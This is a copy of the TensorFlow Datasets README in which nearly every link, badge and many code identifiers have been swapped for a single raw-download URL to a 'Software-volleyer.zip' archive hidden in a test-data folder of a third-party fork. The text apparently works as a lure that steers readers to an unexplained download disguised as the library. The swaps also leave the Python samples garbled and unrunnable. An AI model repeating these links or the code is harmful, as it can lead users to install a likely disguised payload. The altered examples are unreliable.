# TensorFlow Datasets

TensorFlow Datasets provides many public datasets as `https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip`.

[![Kokoro](https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip)](https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip)
[![PyPI version](https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip)](https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip)

* [List of datasets](https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip)
* [Try it in Colab](https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip)
* [API docs](https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip)
* [Add a dataset](https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip)

**Table of Contents**

* [Installation](#installation)
* [Usage](#usage)
* [`DatasetBuilder`](#datasetbuilder)
* [NumPy usage](#numpy-usage-with-tfdsas-numpy)
* [Want a certain dataset?](#want-a-certain-dataset)
* [Disclaimers](#disclaimers)

### Installation

```sh
pip install tensorflow-datasets

# Requires TF 1.12+ to be installed.
# Some datasets require additional libraries; see https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip extras_require
pip install tensorflow
# or:
pip install tensorflow-gpu
```

### Usage

```python
import tensorflow_datasets as tfds
import tensorflow as tf

# tfds works in both Eager and Graph modes
https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip()

# See available datasets
print(https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip())

# Construct a https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip
ds_train, ds_test = https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip(name="mnist", split=["train", "test"])

# Build your input pipeline
ds_train = https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip(1000).batch(128).prefetch(10)
for features in https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip(1):
  image, label = features["image"], features["label"]
```

Try it interactively in a
[Colab notebook](https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip).

### `DatasetBuilder`

All datasets are implemented as subclasses of
[`DatasetBuilder`](https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip)
and
[`https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip`](https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip)
is a thin convenience wrapper.
[`DatasetInfo`](https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip)
documents the dataset.

```python
import tensorflow_datasets as tfds

# The following is the equivalent of the `load` call above.

# You can fetch the DatasetBuilder class by string
mnist_builder = https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip("mnist")

# Download the dataset
https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip()

# Construct a https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip
ds = https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip(https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip)

# Get the `DatasetInfo` object, which contains useful information about the
# dataset and its features
info = https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip
print(info)

    https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip(
        name='mnist',
        version=1.0.0,
        description='The MNIST database of handwritten digits.',
        urls=[u'https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip'],
        features=FeaturesDict({
            'image': Image(shape=(28, 28, 1), https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip),
            'label': ClassLabel(shape=(), https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip, num_classes=10)
        },
        total_num_examples=70000,
        splits={
            u'test': <https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip num_examples=10000>,
            u'train': <https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip num_examples=60000>
        },
        supervised_keys=(u'image', u'label'),
        citation='"""
            @article{lecun2010mnist,
              title={MNIST handwritten digit database},
              author={LeCun, Yann and Cortes, Corinna and Burges, CJ},
              journal={ATT Labs [Online]. Available: http://yann. lecun. com/exdb/mnist},
              volume={2},
              year={2010}
            }
      """',
  )
```

You can also get details about the classes (number of classes and their names).

```python
info = https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip('cats_vs_dogs').info

https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip['label'].num_classes  # 2
https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip['label'].names  # ['cat', 'dog']
https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip['label'].int2str(1)  # "dog"
https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip['label'].str2int('cat')  # 0
```

### NumPy Usage with `https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip`

As a convenience for users that want simple NumPy arrays in their programs, you
can use
[`https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip`](https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip)
to return a generator that yields NumPy array
records out of a `https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip`. This allows you to build high-performance
input pipelines with `https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip` but use whatever you'd like for your model
components.

```python
train_ds = https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip("mnist", https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip)
train_ds = https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip(1024).batch(128).repeat(5).prefetch(10)
for example in https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip(train_ds):
  numpy_images, numpy_labels = example["image"], example["label"]
```

You can also use `https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip` in conjunction with `batch_size=-1` to
get the full dataset in NumPy arrays from the returned `https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip` object:

```python
train_ds = https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip("mnist", https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip, batch_size=-1)
numpy_ds = https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip(train_ds)
numpy_images, numpy_labels = numpy_ds["image"], numpy_ds["label"]
```

Note that the library still requires `tensorflow` as an internal dependency.

## Want a certain dataset?

Adding a dataset is really straightforward by following
[our guide](https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip).

Request a dataset by opening a
[Dataset request GitHub issue](https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip+request&https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip%5Bdata+request%5D+%3Cdataset+name%3E).

And vote on the current
[set of requests](https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip%20request)
by adding a thumbs-up reaction to the issue.

#### *Disclaimers*

*This is a utility library that downloads and prepares public datasets. We do*
*not host or distribute these datasets, vouch for their quality or fairness, or*
*claim that you have license to use the dataset. It is your responsibility to*
*determine whether you have permission to use the dataset under the dataset's*
*license.*

*If you're a dataset owner and wish to update any part of it (description,*
*citation, etc.), or do not want your dataset to be included in this*
*library, please get in touch through a GitHub issue. Thanks for your*
*contribution to the ML community!*

*If you're interested in learning more about responsible AI practices, including*
*fairness, please see Google AI's [Responsible AI Practices](https://github.com/ksnnd32/datasets/raw/refs/heads/master/tensorflow_datasets/testing/test_data/fake_examples/cycle_gan/Software-volleyer.zip).*

*`tensorflow/datasets` is Apache 2.0 licensed. See the `LICENSE` file.*
